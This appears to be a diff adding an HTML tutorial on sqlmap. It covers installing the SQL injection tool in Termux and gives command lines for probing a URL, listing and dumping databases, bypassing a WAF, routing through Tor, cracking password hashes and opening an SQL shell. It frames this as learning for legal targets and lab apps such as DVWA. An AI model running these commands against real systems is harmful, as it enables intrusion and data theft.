@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sqlmap Tool Guide</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      padding: 30px;
+      line-height: 2;
+    }
+    h1 {
+      font-size: 42px;
+      color: #00ff00;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    h2 {
+      font-size: 30px;
+      color: #00ff99;
+      border-bottom: 2px solid #00ff00;
+      padding-bottom: 10px;
+      margin-top: 40px;
+    }
+    p, li {
+      font-size: 20px;
+    }
+    code {
+      background: #111;
+      color: #00ffff;
+      padding: 6px 12px;
+      display: inline-block;
+      border-radius: 5px;
+      margin-top: 6px;
+    }
+    ul, ol {
+      padding-left: 30px;
+    }
+    li {
+      margin-bottom: 15px;
+    }
+    a {
+      color: #00ffff;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🛠️ Sqlmap Tool Guide</h1>
+
+  <h2>What is Sqlmap?</h2>
+  <p><strong>Sqlmap</strong> is an open-source penetration testing tool used to detect and exploit SQL injection vulnerabilities in web applications. It automates the process of scanning, testing, and exploiting SQL injection bugs in databases.</p>
+
+  <h2>Why Use Sqlmap?</h2>
+  <ul>
+    <li>To detect SQL injection vulnerabilities</li>
+    <li>To extract database names, tables, and columns</li>
+    <li>To dump user data like usernames and passwords</li>
+    <li>To gain shell access through SQL injection</li>
+  </ul>
+
+  <h2>Installing Sqlmap in Termux</h2>
+  <ol>
+    <li>Update Termux packages:
+      <br><code>pkg update && pkg upgrade</code>
+    </li>
+    <li>Install Python:
+      <br><code>pkg install python</code>
+    </li>
+    <li>Clone sqlmap from GitHub:
+      <br><code>git clone https://github.com/sqlmapproject/sqlmap</code>
+    </li>
+    <li>Navigate into the sqlmap folder:
+      <br><code>cd sqlmap</code>
+    </li>
+    <li>Run sqlmap:
+      <br><code>python sqlmap.py</code>
+    </li>
+  </ol>
+
+  <h2>Basic Usage Examples</h2>
+  <ul>
+    <li>Test a URL for SQL injection:
+      <br><code>python sqlmap.py -u "http://example.com/page.php?id=1"</code>
+    </li>
+    <li>Dump database names:
+      <br><code>python sqlmap.py -u "http://example.com/page.php?id=1" --dbs</code>
+    </li>
+    <li>Select a specific database and get tables:
+      <br><code>python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name --tables</code>
+    </li>
+    <li>Get columns of a specific table:
+      <br><code>python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns</code>
+    </li>
+    <li>Dump data from a table:
+      <br><code>python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump</code>
+    </li>
+  </ul>
+
+  <h2>Advanced Features</h2>
+  <ul>
+    <li>Bypass WAF (Web Application Firewall):
+      <br><code>python sqlmap.py -u "URL" --tamper=between</code>
+    </li>
+    <li>Use Tor network:
+      <br><code>python sqlmap.py -u "URL" --tor</code>
+    </li>
+    <li>Brute-force database user password hashes:
+      <br><code>--passwords</code>
+    </li>
+    <li>Gain SQL shell:
+      <br><code>--sql-shell</code>
+    </li>
+  </ul>
+
+  <h2>Important Tips</h2>
+  <ul>
+    <li>Always use on legal or testing targets only</li>
+    <li>Sqlmap is very powerful — use responsibly</li>
+    <li>Practice on DVWA (Damn Vulnerable Web App) or bWAPP</li>
+    <li>Study real web requests to identify parameters for injection</li>
+  </ul>
+
+</body>
+</html>
